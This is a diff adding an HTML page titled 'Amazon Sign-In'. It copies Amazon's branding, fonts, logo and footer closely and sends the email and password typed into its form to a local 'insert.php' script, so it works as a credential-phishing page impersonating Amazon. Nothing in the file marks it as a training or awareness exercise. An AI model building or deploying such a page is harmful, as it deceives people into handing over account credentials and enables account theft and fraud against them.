@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<link href="https://fonts.cdnfonts.com/css/amazon-ember" rel="stylesheet">
+<html>
+<head>
+<title>Amazon Sign-In</title>
+<style>
+* {
+  box-sizing: border-box;
+}
+.header {
+  display: block;
+  padding: 15px;
+  text-align: center;
+  margin-left: auto;
+  margin-right: auto;
+}
+.box {
+  width: 350px;
+  border: .75px solid grey;
+  border-radius: 5px;
+  padding: 20px 26px;
+  margin: auto;
+}
+
+.pcolor {
+  padding: 0px 0px 4px;
+  margin: 0px 0px 10px;
+  font-family: "Amazon Ember",Arial,sans-serif;
+  font-weight: normal;
+}
+.emailcolor {
+  padding: 0px 0px 4px 2px;
+  font-size: 13px;
+  font-family: "Amazon Ember",Arial,sans-serif;
+}
+.textcolor {
+  margin:18px 0px 0px;
+  font-size: 12px;
+  font-family: "Amazon Ember",Arial,sans-serif;
+  font-weight:normal
+}
+.custom-field{
+  box-sizing: border-box;
+  border: 1px solid #a6a6a6;
+  padding: 3px 7px;
+  border-radius: 3px;
+  width: 290px;
+  height: 31px;
+}
+.button{
+  width: 288px;
+  height: 31px;
+  margin-top: 15px;
+  background-color: #f0c14b;
+  border: 1px solid #a6a6a6;
+  border-top-color: #949494;
+  background-image: linear-gradient(#f7da90,#e2b33b);
+  border-radius: 3px;
+}
+.icon::before{
+  display: inline-block;
+  content: "";
+  border-top: 4px solid transparent;
+  border-left: 4px solid #949494;
+  border-bottom: 4px solid transparent;
+  margin-right: 10px;
+}
+.dividerbox {
+  width: 350px;
+  padding: 24px 0px 0px 0px;
+  margin: auto;
+}
+.dividertext {
+  font-family: "Amazon Ember",Arial,sans-serif;
+  color: #767676;
+  font-size: 12px;
+  font-weight: normal;
+}
+.separator {
+  display: flex;
+  align-items: center;
+  text-align: center;
+}
+.separator::before,
+.separator::after {
+  content: '';
+  flex: 1;
+  border-bottom: 1px solid #e7e7e7;
+}
+
+.separator:not(:empty)::before {
+  margin-right: .25em;
+}
+
+.separator:not(:empty)::after {
+  margin-left: .25em;
+}
+.btn button{
+  width: 348px;
+  height: 31px;
+  margin: 15px auto;
+  background-color: #e7e9ec;
+  background-image: linear-gradient(#f9f9fa, #e7e9ec);
+  border: 1px solid #a6a6a6;
+  border-top-color: #949494;
+  border-radius: 3px;
+}
+.breck, .btn{
+  display: flex;
+  justify-content: center;
+}
+.links{
+  padding: 26px 0px 0px 0px;
+  dipslay: flex;
+  justify-content: space-between;
+  width: 250px
+  text-alignt: center;
+}
+.footercolor1{
+  font-size: 11px;
+  color: #555555;
+  text-align: center;
+  font-weight: normal;
+}
+footer::before{
+  content: "";
+  display: flex;
+  justify-content: center;
+  width: 80%
+  margin:auto;
+  height: 44px;
+  margin-top: -35px;
+  border-top: 1px solid transparent;
+  box-shadow: 0 10px 15px -20px #333;
+}
+</style>
+</head>
+<body>
+<div class="header">
+   <img src="download2.img" alt="Amazon Logo" style="width:103px;height:31px;">
+</div>
+<div class="box">
+<h5 class="pcolor" style="font-size:28px;">Sign in</h5>
+<div class="emailcolor">
+<form action="insert.php" method="post">
+<label for="email"><b>Email or mobile phone number</br></label>
+</div>
+<input type="text" class="custom-field" id="email" name="email">
+<div class="emailcolor">
+<label for="password">Password</label>
+</div>
+<input type="password" class="custom-field" id="password" name="password">
+<input type="submit" value="Submit" class="button">
+</form>
+<div class="textcolor">
+<p>By continuing, you agree to Amazon's <a href="" style="color:#0066C0;">Conditions of Us</a> and <a href = "" style="color:#0066C0;">Privacy Notice</a>.</p>
+        <a href = "" class="icon" style="color:#0066C0;">Need help?</a>
+</div>
+</div>
+<div class="dividerbox">
+<div class="dividertext">
+<div class="separator">New to Amazon?</div>
+</div>
+</div>
+<div class ="btn">
+<button>Create your Amazon Account</button>
+</div>
+<footer>
+<div class="links">
+<div class="footercolor1">
+<a href = "" style="color:#0066C0;">Conditions of Use</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<a href = "" style="color:#0066C0;">Privacy Notice</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<a href = "" style="color:#0066C0;">Help</a>
+<p>© 1996-2023, Amazon.com, Inc. or its affiliates</p>
+</div>
+</div>
+</footer>
+</body>
+</html>
